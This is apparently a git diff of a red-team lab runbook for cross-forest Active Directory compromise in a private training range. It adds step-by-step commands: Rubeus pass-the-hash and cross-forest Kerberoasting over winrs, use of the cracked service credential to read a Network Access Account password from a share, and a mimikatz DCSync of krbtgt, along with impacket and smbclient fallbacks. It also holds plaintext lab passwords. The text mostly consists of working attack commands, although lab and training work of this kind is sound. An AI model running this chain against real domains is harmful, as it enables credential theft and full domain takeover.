@@ -1,10 +1,10 @@
-# CAMPAIGNS v2 — Phase 8 — Cross-Forest + External Domain
+# CAMPAIGNS v3 — Phase 8 — Cross-Forest + External Domain
 
-> **Campaign v2** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
-> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
+> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
+> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
 > **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
 >
-> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
+> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
 
 **Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.
 
@@ -16,23 +16,49 @@
 |                   |                                                                       |
 | ----------------- | --------------------------------------------------------------------- |
 | **Target**        | dc03 (.12) — range.local (external forest)                            |
-| **From**          | Kali                                                                  |
-| **Starting cred** | Cadre.local DA (from Phase 7) or `analyst_osint`                      |
+| **From**          | **dc01 / mbr01** (using cadre.local Enterprise Admin)                 |
+| **Starting cred** | Cadre.local EA (from Phase 7)                                         |
 | **What you earn** | `s3rv1c3_SCCM!` → `N@A_s3rv1c3!` → **range.local DA** → all 3 domains |
+| **MITRE**         | T1550.002 (Use Alternate Auth Mat) + T1078 (Valid Accounts)             |
 
 
-cadre.local has a bidirectional forest trust with range.local. Cross-forest Kerberoast to harvest the SCCM service account, then chain to NAA extraction.
+cadre.local has a bidirectional forest trust with range.local (SID Filter OFF). In the realistic multi-hop chain, the operator uses the cadre.local Enterprise Admin ticket on `mbr01` or a fresh session staged from `dc01` to cross-forest authenticate to `range.local`.
+
+**Step 1 — From mbr01, request a cross-forest TGT for range.local using cadre EA:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe asktgt /user:Administrator /domain:cadre.local /rc4:<cadre_ea_ntlm> /dc:192.168.77.10 /ptt"
+```
+
+**Step 2 — Cross-forest Kerberoast from mbr01 against dc03:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe kerberoast /domain:range.local /dc:192.168.77.12 /tgtdeleg"
+```
+
+**Step 3 — Use cracked SCCM cred to read NAA from mbr02 vault share:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "net use \\mbr02.range.local\vault /user:range.local\svc_sccm s3rv1c3_SCCM!; type \\mbr02.range.local\vault\naa-rotation-notice.txt"
+# Contains: "Network Access Account RANGE\svc_naa : N@A_s3rv1c3!"
+```
+
+**Step 4 — DA on dc03:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:range.local /user:krbtgt\" \"exit\""
+```
+
+**Fallback from Kali:**
 
 ```bash
 # Cross-forest Kerberoast
 impacket-GetUserSPNs cadre.local/chief_command:'C0mm@nd_Ch1ef!' \
   -target-domain range.local -dc-ip 192.168.77.12 -request
 
-# Crack svc_sccm TGS → s3rv1c3_SCCM!
 # Read NAA bait file on vault share
 smbclient //192.168.77.23/vault -U range.local/svc_sccm%'s3rv1c3_SCCM!' \
   -c "get naa-rotation-notice.txt"
-# Contains: "Network Access Account RANGE\svc_naa : N@A_s3rv1c3!"
 
 # svc_naa is Domain Admin in range.local
 impacket-psexec range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
